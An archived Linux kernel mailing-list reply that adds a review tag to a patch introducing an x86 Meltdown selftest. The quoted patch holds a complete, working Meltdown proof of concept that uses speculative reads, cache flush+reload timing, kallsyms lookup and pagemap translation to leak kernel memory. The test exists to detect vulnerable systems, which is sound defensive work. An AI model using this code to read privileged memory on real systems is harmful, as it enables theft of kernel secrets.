Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 92981673FB2
	for <lists+linux-kselftest@lfdr.de>; Thu, 19 Jan 2023 18:16:02 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229771AbjASRQB (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Thu, 19 Jan 2023 12:16:01 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:58304 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229886AbjASRQB (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Thu, 19 Jan 2023 12:16:01 -0500
Received: from mail-oa1-x2b.google.com (mail-oa1-x2b.google.com [IPv6:2001:4860:4864:20::2b])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id CBAC7872B6;
        Thu, 19 Jan 2023 09:15:58 -0800 (PST)
Received: by mail-oa1-x2b.google.com with SMTP id 586e51a60fabf-1433ef3b61fso3256417fac.10;
        Thu, 19 Jan 2023 09:15:58 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=N6hpR2BLPkHwY6pg/0x14mL94POBBiSwVibIACUor70=;
        b=jMtML7IcDNuC3W9ewyJdQiuEVO/DIB+XNRgLFDzslmykwqueUTgH8Jdlwhr/cMK9os
         ZlLwNv6ZkPXrUPDw6ZQg+0y+k8CFTrglXmU7XcyEC1k1cYCfTs4l8TDRQVH6E49SCPsm
         aQJkPYoICSTCsWDZqFIc/ITCC+G7QlrEBwoT4FDjVVxeUijixY/pE6MgWd7JOxK3vlyl
         fILn2cAqz/VfliFYdIC6OHUgYTZx5Qb5bZWgmvXndbxB34Nts92rETupVlpMiPQ1M1e/
         xmGnlGaZpaJYzBVOWtOwyp3s43KdylHswp6aNXijLpvuO6eRyl4OwJGkfvW+u019KMMv
         vFxQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=N6hpR2BLPkHwY6pg/0x14mL94POBBiSwVibIACUor70=;
        b=djAjmouyH5E33h+zmGKVWzAHf10gjjYrnakJhXDDR/BH66aPcQzgwXnjFxOdvsDC/G
         LvXFG8Jh3Wu7C5pb71SElBdDGswXDckIjVMxF6/R16zcMmkAQPpOniQjCh/ZcHfpSCk2
         Adt1Krch9yEX2POjysva6C3i26ozDW4uYy+83f/Y0wU+McFt0tZEMDZSjzNgrLA1TG/i
         ZIwwfnlFMgAdvvsHEGaYsqnA5F+xYEOOvryH+c7T2ZwLap8KEqIimnoJ3Dy4pGD91SO+
         QErsTJqP88j9VUdan7H9VJkqPxTJilOe+6LI17+WrWGtlzavI+96W2TvTl5hKu+8ZriT
         /WZw==
X-Gm-Message-State: AFqh2kpzRI2WDv9dnKOCBrsKIntua0JcWmQpfM19NIByJmVOv9/5Eegv
        AkREkRTY8ad6udd42qqFysfvcMQNzv5QroSJF38=
X-Google-Smtp-Source: AMrXdXvqkFIJRfIXak/s8ZTaVr2bIMDO+Nu9mgs1ujomNuU0Ztvl0ykVBPUcU6FOw/kBOv5MLZA1rGNnS3BG/RJdJAo=
X-Received: by 2002:a05:6870:6699:b0:15b:b80c:e3bd with SMTP id
 ge25-20020a056870669900b0015bb80ce3bdmr843766oab.273.1674148558016; Thu, 19
 Jan 2023 09:15:58 -0800 (PST)
MIME-Version: 1.0
References: <Y7bD+R/cxZ4p/nWe@ziqianlu-desk1>
In-Reply-To: <Y7bD+R/cxZ4p/nWe@ziqianlu-desk1>
From:   Pavel Boldin <boldin.pavel@gmail.com>
Date:   Thu, 19 Jan 2023 19:15:46 +0200
Message-ID: <CABohvEO796aei7YfuLsjQZoermnyB_5Q9YcwT06PAuFdx2s+0g@mail.gmail.com>
Subject: Re: [PATCH] selftest/x86/meltdown: Add a selftest for meltdown
To:     Aaron Lu <aaron.lu@intel.com>
Cc:     Dave Hansen <dave.hansen@intel.com>,
        Pavel Boldin <pboldin@cloudlinux.com>,
        "Raphael S. Carvalho" <raphaelsc@scylladb.com>,
        Moritz Lipp <github@mlq.me>,
        Daniel Gruss <daniel.gruss@iaik.tugraz.at>,
        Michael Schwarz <michael.schwarz91@gmail.com>,
        Greg KH <gregkh@linuxfoundation.org>,
        linux-kselftest@vger.kernel.org, linux-kernel@vger.kernel.org,
        Igor Seletskiy <i@cloudlinux.com>
Content-Type: text/plain; charset="UTF-8"
X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
        RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS autolearn=ham
        autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

> Signed-off-by: Aaron Lu <aaron.lu@intel.com>
Reviewed-by: Pavel Boldin <boldin.pavel@gmail.com>

--
Sincerely,
Pavel Boldin

P.S. Sorry for lagging, electricity & free time are hard to find these days.

> diff --git a/tools/testing/selftests/x86/Makefile b/tools/testing/selftests/x86/Makefile
> index 0388c4d60af0..36f99c360a56 100644
> --- a/tools/testing/selftests/x86/Makefile
> +++ b/tools/testing/selftests/x86/Makefile
> @@ -13,7 +13,7 @@ CAN_BUILD_WITH_NOPIE := $(shell ./check_cc.sh "$(CC)" trivial_program.c -no-pie)
>  TARGETS_C_BOTHBITS := single_step_syscall sysret_ss_attrs syscall_nt test_mremap_vdso \
>                         check_initial_reg_state sigreturn iopl ioperm \
>                         test_vsyscall mov_ss_trap \
> -                       syscall_arg_fault fsgsbase_restore sigaltstack
> +                       syscall_arg_fault fsgsbase_restore sigaltstack meltdown
>  TARGETS_C_32BIT_ONLY := entry_from_vm86 test_syscall_vdso unwind_vdso \
>                         test_FCMOV test_FCOMI test_FISTTP \
>                         vdso_restorer
> diff --git a/tools/testing/selftests/x86/meltdown.c b/tools/testing/selftests/x86/meltdown.c
> new file mode 100644
> index 000000000000..fcb211dc9038
> --- /dev/null
> +++ b/tools/testing/selftests/x86/meltdown.c
> @@ -0,0 +1,529 @@
> +// SPDX-License-Identifier: GPL-2.0-or-later
> +/*
> + * Copyright (c) 2018 Pavel Boldin <pboldin@cloudlinux.com>
> + * https://github.com/linux-test-project/ltp/blob/master/testcases/cve/meltdown.c
> + */
> +
> +#define _GNU_SOURCE
> +#include <stdio.h>
> +#include <stdlib.h>
> +#include <stdint.h>
> +#include <stdarg.h>
> +#include <string.h>
> +#include <signal.h>
> +#include <ucontext.h>
> +#include <unistd.h>
> +#include <fcntl.h>
> +#include <ctype.h>
> +#include <sys/utsname.h>
> +#include <sys/mman.h>
> +
> +#define PAGE_SHIFT     12
> +#define PAGE_SIZE      0x1000
> +#define PUD_SHIFT       30
> +#define PUD_SIZE        (1UL << PUD_SHIFT)
> +#define PUD_MASK        (~(PUD_SIZE - 1))
> +
> +size_t cache_miss_threshold;
> +unsigned long directmap_base;
> +
> +#define TARGET_OFFSET  9
> +#define TARGET_SIZE    (1 << TARGET_OFFSET)
> +#define BITS_BY_READ   2
> +
> +static inline uint64_t rdtsc(void)
> +{
> +       uint32_t eax, edx;
> +       uint64_t tsc_val;
> +       /*
> +        * The lfence is to wait (on Intel CPUs) until all previous
> +        * instructions have been executed. If software requires RDTSC to be
> +        * executed prior to execution of any subsequent instruction, it can
> +        * execute LFENCE immediately after RDTSC
> +        *                                              */
> +       __asm__ __volatile__("lfence; rdtsc; lfence" : "=a"(eax), "=d"(edx));
> +       tsc_val = ((uint64_t)edx) << 32 | eax;
> +       return tsc_val;
> +}
> +
> +static inline void clflush(volatile void *__p)
> +{
> +       asm volatile("clflush %0" : "+m" (*(volatile char *)__p));
> +}
> +
> +static char target_array[BITS_BY_READ * TARGET_SIZE];
> +
> +static void clflush_target(void)
> +{
> +       int i;
> +
> +       for (i = 0; i < BITS_BY_READ; i++)
> +               clflush(&target_array[i * TARGET_SIZE]);
> +}
> +
> +extern char failshere[];
> +extern char stopspeculate[];
> +
> +static void __attribute__((noinline)) speculate(unsigned long addr, char bit)
> +{
> +       register char mybit asm ("cl") = bit;
> +#ifdef __x86_64__
> +       asm volatile (
> +               "1:\n\t"
> +
> +               ".rept 300\n\t"
> +               "add $0x141, %%rax\n\t"
> +               ".endr\n"
> +
> +               "failshere:\n\t"
> +               "movb (%[addr]), %%al\n\t"
> +               "ror %[bit], %%rax\n\t"
> +               "and $1, %%rax\n\t"
> +               "shl $9, %%rax\n\t"
> +               "jz 1b\n\t"
> +
> +               "movq (%[target], %%rax, 1), %%rbx\n"
> +
> +               "stopspeculate: \n\t"
> +               "nop\n\t"
> +               :
> +               : [target] "r" (target_array),
> +                 [addr] "r" (addr),
> +                 [bit] "r" (mybit)
> +               : "rax", "rbx"
> +       );
> +#else /* defined(__x86_64__) */
> +       asm volatile (
> +               "1:\n\t"
> +
> +               ".rept 300\n\t"
> +               "add $0x141, %%eax\n\t"
> +               ".endr\n"
> +
> +               "failshere:\n\t"
> +               "movb (%[addr]), %%al\n\t"
> +               "ror %[bit], %%eax\n\t"
> +               "and $1, %%eax\n\t"
> +               "shl $9, %%eax\n\t"
> +               "jz 1b\n\t"
> +
> +               "movl (%[target], %%eax, 1), %%ebx\n"
> +
> +               "stopspeculate: \n\t"
> +               "nop\n\t"
> +               :
> +               : [target] "r" (target_array),
> +                 [addr] "r" (addr),
> +                 [bit] "r" (mybit)
> +               : "rax", "ebx"
> +       );
> +#endif
> +}
> +
> +#ifdef __i386__
> +# define REG_RIP       REG_EIP
> +#endif
> +
> +static void sigsegv(int sig, siginfo_t *siginfo, void *context)
> +{
> +       ucontext_t *ucontext = context;
> +       unsigned long *prip = (unsigned long *)&ucontext->uc_mcontext.gregs[REG_RIP];
> +       if (*prip != (unsigned long)failshere) {
> +               printf("Segmentation fault at unexpected location %lx\n", *prip);
> +               abort();
> +       }
> +       *prip = (unsigned long)stopspeculate;
> +       return;
> +}
> +
> +static int set_signal(void)
> +{
> +       struct sigaction act = {
> +               .sa_sigaction = sigsegv,
> +               .sa_flags = SA_SIGINFO,
> +       };
> +
> +       return sigaction(SIGSEGV, &act, NULL);
> +}
> +
> +static inline int get_access_time(volatile char *addr)
> +{
> +       unsigned long long time1, time2;
> +       volatile int j __attribute__((__unused__));
> +
> +       time1 = rdtsc();
> +       j = *addr;
> +       time2 = rdtsc();
> +
> +       return time2 - time1;
> +}
> +
> +static int cache_hit_threshold;
> +static int hist[BITS_BY_READ];
> +
> +static void check(void)
> +{
> +       int i, time;
> +       volatile char *addr;
> +
> +       for (i = 0; i < BITS_BY_READ; i++) {
> +               addr = &target_array[i * TARGET_SIZE];
> +
> +               time = get_access_time(addr);
> +
> +               if (time <= cache_hit_threshold)
> +                       hist[i]++;
> +       }
> +}
> +
> +#define CYCLES 10000
> +static int readbit(int fd, unsigned long addr, char bit)
> +{
> +       int i, ret;
> +       static char buf[256];
> +
> +       memset(hist, 0, sizeof(hist));
> +
> +       for (i = 0; i < CYCLES; i++) {
> +               /*
> +                * Make the to-be-stolen data cache and tlb hot
> +                * to increase success rate.
> +                */
> +               ret = pread(fd, buf, sizeof(buf), 0);
> +               if (ret < 0)
> +                       printf("[INFO]\tCan't read fd");
> +
> +               clflush_target();
> +
> +               speculate(addr, bit);
> +               check();
> +       }
> +
> +       if (hist[1] > CYCLES / 10)
> +               return 1;
> +       return 0;
> +}
> +
> +static int readbyte(int fd, unsigned long addr)
> +{
> +       int bit, res = 0;
> +
> +       for (bit = 0; bit < 8; bit ++ )
> +               res |= (readbit(fd, addr, bit) << bit);
> +
> +       return res;
> +}
> +
> +static int mysqrt(long val)
> +{
> +       int root = val / 2, prevroot = 0, i = 0;
> +
> +       while (prevroot != root && i++ < 100) {
> +               prevroot = root;
> +               root = (val / root + root) / 2;
> +       }
> +
> +       return root;
> +}
> +
> +#define ESTIMATE_CYCLES        1000000
> +static void set_cache_hit_threshold(void)
> +{
> +       long cached, uncached, i;
> +
> +       for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
> +               cached += get_access_time(target_array);
> +
> +       for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
> +               cached += get_access_time(target_array);
> +
> +       for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
> +               clflush(target_array);
> +               uncached += get_access_time(target_array);
> +       }
> +
> +       cached /= ESTIMATE_CYCLES;
> +       uncached /= ESTIMATE_CYCLES;
> +
> +       cache_hit_threshold = mysqrt(cached * uncached);
> +
> +       printf("[INFO]\taccess time: cached = %ld, uncached = %ld, threshold = %d\n",
> +               cached, uncached, cache_hit_threshold);
> +}
> +
> +static unsigned long find_symbol_in_file(const char *filename, const char *symname)
> +{
> +       unsigned long addr;
> +       char type, *buf;
> +       int found;
> +       FILE *fp;
> +
> +       fp = fopen(filename, "r");
> +       if (!fp) {
> +               printf("[INFO]\tFailed to open %s\n", filename);
> +               return 0;
> +       }
> +
> +       buf = malloc(4096);
> +       if (!buf)
> +               return 0;
> +
> +       found = 0;
> +       while (fscanf(fp, "%lx %c %s\n", &addr, &type, buf)) {
> +               if (!strcmp(buf, symname)) {
> +                       found = 1;
> +                       break;
> +               }
> +       }
> +
> +       free(buf);
> +       fclose(fp);
> +
> +       return found ? addr : 0;
> +}
> +
> +static unsigned long find_kernel_symbol(const char *name)
> +{
> +       char systemmap[256];
> +       struct utsname utsname;
> +       unsigned long addr;
> +
> +       addr = find_symbol_in_file("/proc/kallsyms", name);
> +       if (addr)
> +               return addr;
> +
> +       if (uname(&utsname) < 0)
> +               return 0;
> +       sprintf(systemmap, "/boot/System.map-%s", utsname.release);
> +       addr = find_symbol_in_file(systemmap, name);
> +       return addr;
> +}
> +
> +static unsigned long saved_cmdline_addr;
> +static int spec_fd;
> +
> +#define READ_SIZE 32
> +
> +static int test_read_saved_command_line(void)
> +{
> +       unsigned int i, score = 0, ret;
> +       unsigned long addr;
> +       unsigned long size;
> +       char read[READ_SIZE] = { 0 };
> +       char expected[READ_SIZE] = { 0 };
> +       int expected_len;
> +
> +       saved_cmdline_addr = find_kernel_symbol("saved_command_line");
> +       if (!saved_cmdline_addr) {
> +               printf("[SKIP]\tCan not find symbol saved_command_line\n");
> +               return 0;
> +       }
> +       printf("[INFO]\tsaved_cmdline_addr: 0x%lx\n", saved_cmdline_addr);
> +
> +       spec_fd = open("/proc/cmdline", O_RDONLY);
> +       if (spec_fd == -1) {
> +               printf("[SKIP]\tCan not open /proc/cmdline\n");
> +               return 0;
> +       }
> +
> +       expected_len = pread(spec_fd, expected, sizeof(expected), 0);
> +       if (expected_len < 0) {
> +               printf("[SKIP]\tCan't read /proc/cmdline\n");
> +               return 0;
> +       }
> +
> +       /* read address of saved_cmdline_addr */
> +       addr = saved_cmdline_addr;
> +       size = sizeof(addr);
> +       for (i = 0; i < size; i++) {
> +               ret = readbyte(spec_fd, addr);
> +               read[i] = ret;
> +               addr++;
> +       }
> +
> +       /* read value pointed to by saved_cmdline_addr */
> +       memcpy(&addr, read, sizeof(addr));
> +       memset(read, 0, sizeof(read));
> +       printf("[INFO]\tsaved_command_line: 0x%lx\n", addr);
> +       size = expected_len;
> +
> +       if (!addr)
> +               goto done;
> +
> +       for (i = 0; i < size; i++) {
> +               ret = readbyte(spec_fd, addr);
> +               read[i] = ret;
> +               addr++;
> +       }
> +
> +       for (i = 0; i < size; i++)
> +               if (expected[i] == read[i])
> +                       score++;
> +
> +done:
> +       if (score > size / 2) {
> +               printf("[FAIL]\ttest_read_saved_command_line: both high and low kernel mapping leak found.\n");
> +               ret = -1;
> +       } else {
> +               printf("[OK]\ttest_read_saved_command_line: no leak found.\n");
> +               ret = 0;
> +       }
> +
> +       close(spec_fd);
> +
> +       return ret;
> +}
> +
> +static int get_directmap_base(void)
> +{
> +       char *buf;
> +       FILE *fp;
> +       size_t n;
> +       int ret;
> +
> +       fp = fopen("/sys/kernel/debug/page_tables/kernel", "r");
> +       if (!fp)
> +               return -1;
> +
> +       buf = NULL;
> +       ret = -1;
> +       while (getline(&buf, &n, fp) != -1) {
> +               if (!strstr(buf, "Kernel Mapping"))
> +                       continue;
> +
> +               if (getline(&buf, &n, fp) != -1 &&
> +                   sscanf(buf, "0x%lx", &directmap_base) == 1) {
> +                       printf("[INFO]\tdirectmap_base=0x%lx/0x%lx\n", directmap_base, directmap_base & PUD_MASK);
> +                       directmap_base &= PUD_MASK;
> +                       ret = 0;
> +                       break;
> +               }
> +       }
> +
> +       fclose(fp);
> +       free(buf);
> +       return ret;
> +}
> +
> +static int virt_to_phys(unsigned long virt, unsigned long *phys)
> +{
> +       unsigned long pfn;
> +       uint64_t val;
> +       int fd, ret;
> +
> +       fd = open("/proc/self/pagemap", O_RDONLY);
> +       if (fd == -1) {
> +               printf("[INFO]\tFailed to open pagemap\n");
> +               return -1;
> +       }
> +
> +       ret = pread(fd, &val, sizeof(val), (virt >> PAGE_SHIFT) * sizeof(uint64_t));
> +       if (ret == -1) {
> +               printf("[INFO]\tFailed to read pagemap\n");
> +               goto out;
> +       }
> +
> +       if (!(val & (1ULL << 63))) {
> +               printf("[INFO]\tPage not present according to pagemap\n");
> +               ret = -1;
> +               goto out;
> +       }
> +
> +       pfn = val & ((1ULL << 55) - 1);
> +       if (pfn == 0) {
> +               printf("[INFO]\tNeed CAP_SYS_ADMIN to show pfn\n");
> +               ret = -1;
> +               goto out;
> +       }
> +
> +       ret = 0;
> +       *phys = (pfn << PAGE_SHIFT) | (virt & (PAGE_SIZE - 1));
> +
> +out:
> +       close(fd);
> +       return ret;
> +}
> +
> +static int test_read_local_var(void)
> +{
> +       char path[] = "/tmp/meltdown.XXXXXX";
> +       char string[] = "test string";
> +       unsigned long phys;
> +       int i, len, ret;
> +       char *result;
> +       void *p;
> +
> +       if (get_directmap_base() == -1) {
> +               printf("[SKIP]\tFailed to get directmap base. Need root and CONFIG_PTDUMP_DEBUGFS\n");
> +               return 0;
> +       }
> +
> +       spec_fd = mkstemp(path);
> +       if (spec_fd == -1) {
> +               printf("[SKIP]\tCan not open %s\n", path);
> +               return 0;
> +       }
> +       ftruncate(spec_fd, 0x1000);
> +
> +       p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, spec_fd, 0);
> +       if (p == MAP_FAILED) {
> +               printf("[SKIP]\tmmap spec_fd failed\n");
> +               return 0;
> +       }
> +       memcpy(p, string, sizeof(string));
> +
> +       if (virt_to_phys((unsigned long)p, &phys) == -1) {
> +               printf("[SKIP]\tCan not convert virtual address to physical address\n");
> +               return 0;
> +       }
> +
> +       len = strlen(string);
> +       result = malloc(len + 1);
> +       if (!result) {
> +               printf("[SKIP]\tNot enough memory for malloc\n");
> +               return 0;
> +       }
> +       memset(result, 0, len + 1);
> +
> +       for (i = 0; i < len; i++, phys++) {
> +               result[i] = readbyte(spec_fd, directmap_base + phys);
> +               if (result[i] == 0)
> +                       break;
> +       }
> +
> +       ret = !strncmp(string, result, len);
> +       if (ret)
> +               printf("[FAIL]\ttest_read_local_var: low kernel mapping leak found.\n");
> +       else
> +               printf("[OK]\ttest_read_local_var: no leak found.\n");
> +
> +       free(result);
> +       munmap(p, 0x1000);
> +       close(spec_fd);
> +
> +       return ret;
> +}
> +
> +int main(void)
> +{
> +       int ret1, ret2;
> +
> +       printf("[RUN]\tTest if system is vulnerable to meltdown\n");
> +
> +       set_cache_hit_threshold();
> +
> +       memset(target_array, 1, sizeof(target_array));
> +
> +       if (set_signal() < 0) {
> +               printf("[SKIP]\tCan not set handler for segfault\n");
> +               return 0;
> +       }
> +
> +       ret1 = test_read_local_var();
> +       ret2 = test_read_saved_command_line();
> +
> +       if (ret1 || ret2)
> +               return -1;
> +
> +       return 0;
> +}
> --
> 2.39.0
>
